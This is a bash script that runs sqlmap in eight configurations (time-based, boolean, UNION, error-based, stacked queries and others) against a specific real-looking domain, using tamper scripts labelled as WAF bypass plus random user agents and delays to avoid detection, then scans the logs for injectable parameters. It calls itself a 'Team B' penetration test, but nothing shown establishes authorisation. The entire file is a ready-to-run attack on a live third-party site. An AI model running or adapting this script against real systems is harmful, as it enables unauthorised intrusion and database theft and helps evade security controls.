#!/bin/bash

# Advanced SQLMap Testing Script with WAF Bypass
# Team B - Panama8888b Penetration Test
# Updated and tested version

TARGET_URL="https://member.panama8888b.com/public/js/v2/app.js?v=25.1"
OUTPUT_DIR="./sqlmap_results"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Create output directory
mkdir -p "$OUTPUT_DIR"

echo -e "${GREEN}[+] Advanced SQLMap Testing with WAF Bypass${NC}"
echo -e "${GREEN}[+] Target: $TARGET_URL${NC}"
echo -e "${BLUE}[+] Output Directory: $OUTPUT_DIR${NC}"
echo "=================================================="

# Function to run sqlmap test
run_sqlmap_test() {
    local test_name="$1"
    local test_dir="$2"
    local sqlmap_args="$3"
    
    echo -e "${YELLOW}[*] $test_name${NC}"
    echo -e "${BLUE}[*] Output: $test_dir${NC}"
    
    # Run sqlmap with provided arguments
    sqlmap $sqlmap_args
    
    # Check if test was successful
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[+] $test_name completed successfully${NC}"
    else
        echo -e "${RED}[!] $test_name failed or was interrupted${NC}"
    fi
    
    echo "----------------------------------------"
    sleep 2
}

# Test 1: Basic detection with tamper scripts
run_sqlmap_test "Test 1: Basic detection with tamper scripts" \
    "$OUTPUT_DIR/test1" \
    "-u $TARGET_URL \
    --batch \
    --level=3 \
    --risk=2 \
    --tamper=space2comment,charencode \
    --random-agent \
    --delay=1 \
    --timeout=15 \
    --retries=2 \
    --output-dir=$OUTPUT_DIR/test1"

# Test 2: Time-based injection
run_sqlmap_test "Test 2: Time-based injection" \
    "$OUTPUT_DIR/test2" \
    "-u $TARGET_URL \
    --batch \
    --technique=T \
    --time-sec=5 \
    --dbms=mssql \
    --tamper=space2comment \
    --random-agent \
    --delay=2 \
    --output-dir=$OUTPUT_DIR/test2"

# Test 3: Boolean-based blind injection
run_sqlmap_test "Test 3: Boolean-based blind injection" \
    "$OUTPUT_DIR/test3" \
    "-u $TARGET_URL \
    --batch \
    --technique=B \
    --dbms=mssql \
    --tamper=space2comment,between \
    --random-agent \
    --delay=1 \
    --output-dir=$OUTPUT_DIR/test3"

# Test 4: UNION-based injection
run_sqlmap_test "Test 4: UNION-based injection" \
    "$OUTPUT_DIR/test4" \
    "-u $TARGET_URL \
    --batch \
    --technique=U \
    --union-cols=1-5 \
    --dbms=mssql \
    --tamper=space2comment \
    --random-agent \
    --delay=1 \
    --output-dir=$OUTPUT_DIR/test4"

# Test 5: Error-based injection
run_sqlmap_test "Test 5: Error-based injection" \
    "$OUTPUT_DIR/test5" \
    "-u $TARGET_URL \
    --batch \
    --technique=E \
    --dbms=mssql \
    --tamper=space2comment \
    --random-agent \
    --delay=1 \
    --output-dir=$OUTPUT_DIR/test5"

# Test 6: Stacked queries
run_sqlmap_test "Test 6: Stacked queries" \
    "$OUTPUT_DIR/test6" \
    "-u $TARGET_URL \
    --batch \
    --technique=S \
    --dbms=mssql \
    --tamper=space2comment \
    --random-agent \
    --delay=2 \
    --output-dir=$OUTPUT_DIR/test6"

# Test 7: Advanced WAF bypass
run_sqlmap_test "Test 7: Advanced WAF bypass" \
    "$OUTPUT_DIR/test7" \
    "-u $TARGET_URL \
    --batch \
    --level=5 \
    --risk=3 \
    --dbms=mssql \
    --tamper=space2comment,charencode,randomcase,between \
    --random-agent \
    --delay=3 \
    --timeout=20 \
    --retries=3 \
    --output-dir=$OUTPUT_DIR/test7"

# Test 8: Custom injection point
run_sqlmap_test "Test 8: Custom injection point" \
    "$OUTPUT_DIR/test8" \
    "-u https://member.panama8888b.com/public/js/v2/app.js?v=25.1* \
    --batch \
    --level=3 \
    --risk=2 \
    --dbms=mssql \
    --tamper=space2comment \
    --random-agent \
    --delay=1 \
    --output-dir=$OUTPUT_DIR/test8"

# Generate summary report
echo -e "${GREEN}[+] Generating summary report...${NC}"
echo "=================================================="
echo "SQLMap Test Summary Report" > "$OUTPUT_DIR/summary_report.txt"
echo "Generated: $(date)" >> "$OUTPUT_DIR/summary_report.txt"
echo "Target: $TARGET_URL" >> "$OUTPUT_DIR/summary_report.txt"
echo "" >> "$OUTPUT_DIR/summary_report.txt"

# Check each test directory for results
for test_dir in "$OUTPUT_DIR"/test*; do
    if [ -d "$test_dir" ]; then
        test_name=$(basename "$test_dir")
        echo "=== $test_name ===" >> "$OUTPUT_DIR/summary_report.txt"
        
        # Check for log files
        if [ -f "$test_dir/log" ]; then
            echo "Log file exists" >> "$OUTPUT_DIR/summary_report.txt"
        fi
        
        # Check for results
        if [ -f "$test_dir/log" ] && grep -q "injectable" "$test_dir/log"; then
            echo "VULNERABILITY DETECTED!" >> "$OUTPUT_DIR/summary_report.txt"
            echo -e "${RED}[!] VULNERABILITY FOUND in $test_name${NC}"
        else
            echo "No vulnerability detected" >> "$OUTPUT_DIR/summary_report.txt"
        fi
        
        echo "" >> "$OUTPUT_DIR/summary_report.txt"
    fi
done

echo -e "${GREEN}[+] All tests completed!${NC}"
echo -e "${BLUE}[+] Check results in: $OUTPUT_DIR${NC}"
echo -e "${BLUE}[+] Summary report: $OUTPUT_DIR/summary_report.txt${NC}"
echo "=================================================="

# Display summary
echo -e "${YELLOW}[*] Quick Summary:${NC}"
cat "$OUTPUT_DIR/summary_report.txt"